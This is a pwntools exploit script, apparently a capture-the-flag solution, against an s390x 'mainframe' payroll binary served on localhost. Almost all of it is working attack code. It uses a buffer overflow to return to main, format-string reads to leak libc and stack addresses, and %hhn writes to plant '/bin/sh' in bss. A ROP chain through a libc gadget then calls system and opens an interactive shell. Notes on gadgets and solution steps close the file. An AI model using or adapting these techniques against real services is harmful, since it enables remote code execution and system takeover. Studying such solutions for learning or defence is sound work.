from pwn import *
import sys 

def sxor(payload):
    p.send(xor(payload + b'\x00',82))

def leaker(addr):
    print(f"LEAKING: {hex(addr)}")
    output = b''
    p.clean()
    while len(output)<8:
        sleep(.5)
        sxor(b"%6$s".ljust(8,b" ") + p64(addr+len(output)))
        a = p.recvuntil(b"Enter payroll data:\n")
        a = a.replace(b"Processing data...\n",b"").replace(b"GIBSON S390X\nEnter payroll data:\n",b"") 
        if a == b' ' *4:
            #print("NULL BYTE")
            output += b"\x00"
        else:
            output += a.replace(b'    ',b'')
        p.clean()
    return(unpack(output,'all'))

context.arch = 's390' 
context.log_level = 'info'
exe = ELF("./bin/mainframe")
libc = ELF("./bin/libc.so.6")

libc_offset = 0xa184d8
bof_offset = 1144
fstack = 0x1002318
bss = 0x0000000001002048

DEBUG = False
p = remote("localhost", 8888 if DEBUG else 9999)

test = p.clean(timeout=1)

if b"Segmentation" in test:
    print("SEG FAILT")
    sys.exit()

if b"core dumped" in test:
    print("SEG FAULT, EXITING")
    sys.exit()

if b"Address already in use" in test:
    print("RESTART DOCKER, QEMU bug")
    sys.exit()

if b"Enter payroll data:\n" in test:
    pass

# Overwrite stack saves PC 
payload = b''
payload += xor("%p  "*10, 82) * 3
payload += b'A'*(bof_offset -len(payload))
payload += p64(exe.symbols.main)


p.send(payload)
p.recvuntil(b"Processing data...\n")

sleep(.1)
libc.address = leaker(exe.got.printf) - libc.symbols.printf


print(f"LIBC: " + hex(libc.address))
assert ( leaker(exe.got.puts) == libc.symbols.puts)
print("CONFIRMED LIBC")


p.clean()

# Breakpoint at printf %n move
print(f"BREAK: {hex(480488 + libc.address)}")


print("PRINT: " + hex(libc.symbols.printf))
print("SYSTEM: " + hex(libc.symbols.system))
p.clean()



# Stack leak
environ = leaker(libc.symbols.environ)
valid_r15 = environ - 752

print(f"env: {hex(environ)}")
print(f"r15: {hex(valid_r15)}")

p.clean()
# Number of written bytes differed bit, testing a write to make sure # of bytes written matches expectations
sxor(b"%7$69x".ljust(24,b" ") + b"%9$hhn".ljust(8,b" ") + p64(exe.bss()))
sleep(.5)

print("CHECKING PRINTF %n OFFSETS")
a = p.clean()
a = a.replace(b"Processing data...\n",b"").replace(b"GIBSON S390X\nEnter payroll data:\n",b"")
written = len(a) -2
var = written - 69


# Writing /bin/sh into bss
print(f"MOVING /bin/sh into {hex(exe.bss())}")

for i in range(len(b"/bin/sh")):
    sleep(.5)
    sxor(f"%7${b'/bin/sh'[i] - var}x".ljust(24," ").encode('latin') + b"%9$hhn".ljust(8,b" ") + p64(exe.bss() + i))
    p.clean()
    sleep(.5)

print("FINAL PAYLOAD")
payload = b''
payload += b"A"* ( bof_offset - len(payload) - 24)
payload += p64(exe.bss()) 
payload += p64(valid_r15) 
payload += b"A"* ( bof_offset - len(payload))

# GADGET, mov r2, r11, "ret", need to setup make stack for it
"""
   0:   b9 14 00 2b             lgfr    %r2, %r11                                                    
   4:   eb 6f f0 e8 00 04       lmg     %r6, %r15, 232(%r15)
   a:   07 fe                   br      %r14  
"""
payload += p64(libc.address + 0x160554)
payload += p64(valid_r15)
# Fake stack padding r6-r13
payload += p64(0xdeadbeef) * (0x10 +5)
payload += p64(libc.symbols.system)
payload += p64(valid_r15)

p.send(payload)
p.clean()
print("SHELL:")
p.interactive()


"""
1. Leak Libc 
2. Back to main
3. Printf payload to replace printf with system
4. printf ("/bin/sh")

11,12,13,14,15 CONTROL

TODO:
    OG SOLUTION; why crash??

    FIND ONE GADGET???

    ~~0xffffffff solution, GIANT PRINT TIMES : TIMEOUT SAY NOP~~


r7,r3 stack, we overwrite

exit:libc.address + 173842

  160e60:       b9 14 00 2b             lgfr    %r2,%r11                                                                                                                                                   
  1614bc:       b9 04 00 2b             lgr     %r2,%r11
  #169c90:       c4 28 00 03 93 78       lgrl    %r2,1dc380 <__key_encryptsession_pk_LOCAL@GLIBC_2.2+0x188>
dump bin/sh string somewhere??
"""


